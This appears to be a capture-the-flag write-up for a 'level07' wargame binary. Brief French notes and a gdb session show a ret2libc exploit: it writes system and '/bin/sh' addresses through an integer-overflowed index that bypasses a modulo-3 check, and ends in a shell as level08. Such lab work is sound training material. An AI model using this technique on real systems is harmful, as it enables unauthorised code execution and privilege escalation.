   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
   0x08048697 <+103>:	movl   $0x8048ae6,(%esp)
   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
   0x080486a3 <+115>:	movl   $0x8048af8,(%esp)


    0xf7f897ec   ->   "/bin/sh"   ->  uint  =   4160264172

    0xf7e6aed0   ->    system     ->  uint  =   4159090384


    exec env - gdb -ex 'unset env LINES' -ex 'unset env COLUMNS' ./level07 


    4294967295
    1073741823
    456

    1073741938


En gros, on veut changer les adresses a 114 et 116 bytes apres esp pour faire un ret2libc
pour faire ca c'est facile, a 116 on veut "/bin/sh" et a 114 on veut system
pour trouver les adresses on peut utiliser gdb et faire find __libc_start_main,+999999999,"/bin/sh"
et find system,+999999999,"/bin/sh"
Apres ca on convertit les adresses en uint et on les ecrit avec store
puis on fait quit pour faire un ret2libc
super facile avec "/bin/sh" parceque 116 est pas modulo 3
Par contre pour 114, on doit faire attention a ce que le nombre est modulo 3
donc le programme nous empeche d'ecrire l'addresse de system directement
mais comme data est un tableau de uint, on peut faire overflow *(uint *)(uVar2 * 4 + param_1) = uVar1;
avec un petit programe on trouve quel nombre overflow * 4 est pas modulo 3 equal 114 * 4
et boom c'est 1073741938 du coup on fait tout ca et on a un shell



    (gdb) b *0x08048857
Breakpoint 1 at 0x8048857
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------


Breakpoint 1, 0x08048857 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+999999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) i r
eax            0x8048d4b	134516043
ecx            0xffffffff	-1
edx            0xf7fd08b8	-134412104
ebx            0xffffdc74	-9100
esp            0xffffdc50	0xffffdc50
ebp            0xffffde38	0xffffde38
esi            0x0	0
edi            0xffffdfdc	-8228
eip            0x8048857	0x8048857 <main+308>
eflags         0x282	[ SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) x/124wx 0xffffdc50
0xffffdc50:	0x08048d4b	0x00000000	0x00000017	0xf7fdc714
0xffffdc60:	0x00000098	0xffffffff	0xffffdee0	0xffffded8
0xffffdc70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdc80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdc90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdca0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcb0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcc0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcd0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdce0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd00:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd30:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdda0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddb0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddc0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddd0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdde0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffde00:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffde10:	0x00000000	0x00000000	0x00000000	0x3546a800
0xffffde20:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffde30:	0x00000000	0x00000000	0x00000000	0xf7e45513
(gdb) x/124wx 0xffffdc70
0xffffdc70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdc80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdc90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdca0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcb0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcc0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcd0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdce0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdcf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd00:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd30:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdd90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdda0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddb0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddc0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddd0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdde0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffddf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffde00:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffde10:	0x00000000	0x00000000	0x00000000	0x3546a800
0xffffde20:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffde30:	0x00000000	0x00000000	0x00000000	0xf7e45513
0xffffde40:	0x00000001	0xffffded4	0xffffdedc	0xf7fd3000
0xffffde50:	0x00000000	0xffffde1c	0xffffdedc	0x00000000
(gdb) 
(gdb) c
Continuing.
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully

Breakpoint 1, 0x08048857 in main ()
(gdb) x/12wx 0xffffde30 
0xffffde30:	0x00000000	0x00000000	0x00000000	0xf7e45513
0xffffde40:	0x00000001	0xf7f897ec	0xffffdedc	0xf7fd3000
0xffffde50:	0x00000000	0xffffde1c	0xffffdedc	0x00000000
(gdb) c
Continuing.
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

Breakpoint 1, 0x08048857 in main ()
(gdb) x/12wx 0xffffde30
0xffffde30:	0x00000000	0x00000000	0x00000000	0xf7e6aed0
0xffffde40:	0x00000001	0xf7f897ec	0xffffdedc	0xf7fd3000
0xffffde50:	0x00000000	0xffffde1c	0xffffdedc	0x00000000
(gdb) c
Continuing.
Input command: quit
$ whoami
level08
